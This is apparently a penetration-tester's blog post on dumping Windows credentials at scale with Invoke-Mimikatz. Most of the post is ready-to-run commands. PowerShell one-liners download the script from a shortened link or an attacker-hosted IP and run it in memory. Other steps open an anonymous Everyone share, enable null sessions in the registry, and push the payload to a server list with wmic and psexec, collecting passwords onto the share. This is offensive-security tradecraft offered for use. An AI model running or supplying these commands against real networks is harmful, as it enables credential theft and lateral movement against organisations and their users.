[clymb3r](http://clymb3r.wordpress.com/) recently posted a script called "[Invoke-Mimikatz.ps1](https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz)" basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.

You can very easily use this script directly from an admin command prompt as so:

    powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"

(This works REALLY well for Citrix and Kiosk scenarios and it's too hard to type/remember)
This runs the powershell script by directly pulling it from Github and executing it "in memory" on your system. 

One of the awesome added capabilities for this script is to run on a list of hosts. as so:

    powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds -ComputerName @('computer1', 'computer2')"

This works great as all the output is directly on your system and all executed through Powershell Remoting. [Powershell Remoting]("http://msdn.microsoft.com/en-us/library/windows/desktop/ee706585(v=vs.85).aspx") is pretty much the same as WinRM. This service however is not enabled by default and can be pretty hit or miss on how much any given enterprise uses WinRM. However, it is usually the servers and more important systems that have it enabled more often than not.

You can find WinRM / PowerShell Remoting by scanning for the service port 47001 as well as the default comm ports for WinRM 5985 (HTTP) and 5986 (HTTPS).

If you find that your target isn't a WinRM rich environment or you just want more passwords you can take a slightly more painful route, I call it "Mass Mimikatz"

Step 1. Make a share, we are doing this so we can not only collect the output of all our computers passwords, but to host the CMD batch file that will run the powershell script:

    cd\
    mkdir open
    net share open=C:\open /grant:everyone,full
    icacls C:\open\ /grant Everyone:(OI)(CI)F /t

We are setting "Everyone" permissions on a Share (net share) and NTFS (icacls) level for this to work properly.

Step 2. Set registry keys. There are two registry keys that we need to set. The first allows Null Sessions to our new share and the second allows null users to have the "Everyone" token so that we don't have to get crazy with our permissions. I have create a meterpreter script that has a bunch of error checking here: [massmimi_reg.rb](https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/massmimi_reg.rb)
or you can just make the following changes"

    HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ  = open
    HKLM\System\CurrentControlSet\Contol\Lsa "EveryoneIncludesAnonymous" = 1

Step 3. Change directory into new "open" directory. This is so our uploads and in particular our web server will be hosted out of the correct directory.

Step 4. Upload powershell script [powermeup.cmd](https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/powermeup.cmd) - this script will run our hosted Invoke-Mimikatz script on each host:

    powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.127:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds > \\192.168.1.127\open\%COMPUTERNAME%.txt 2>&1

Step 5. Upload [clymb3r](http://clymb3r.wordpress.com/)'s Invoke-Mimikatz ps1 - Download from [PowerSploit](https://github.com/mattifestation/PowerSploit) repo: [source on github](https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)

Step 6. Upload mongoose: [Downloads Page](http://cesanta.com/downloads.html) - Both regular and tiny versions work. This is an awesome, single executable webserver that supports LUA, Sqlite, and WebDAV out of the box. Tiny version is under 100k.

Step 7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on. You'll have to gather this one way or another.

Step 8. Execute mongoose (from directory with mimikatz.ps1) - This will start a listener with directory listings enabled on port 8080 by default

Step 9a. Execute wmic:

    wmic /node:@serverlist.txt process call create "\\192.168.92.127\open\powershellme.cmd"

Step 9b. Execute wmic with creds:

    wmic /node:@serverlist.txt /user:PROJECTMENTOR\jdoe /password:ASDqwe123 process call create "\\192.168.92.127\open\powershellme.cmd"

Step 10. Watch as text files full of wonder and joy fill your share.

You can find the scripts here: https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz

Don't forget to clean up::

1. kill mongoose process
2. net share open /delete
3. kill/reset registry values
4. delete "open" directory

Got a better way of getting this done? Please leave a comment.

P.S. You could just enable Powershell Remoting for them ;)

    psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe "enable-psremoting -force"
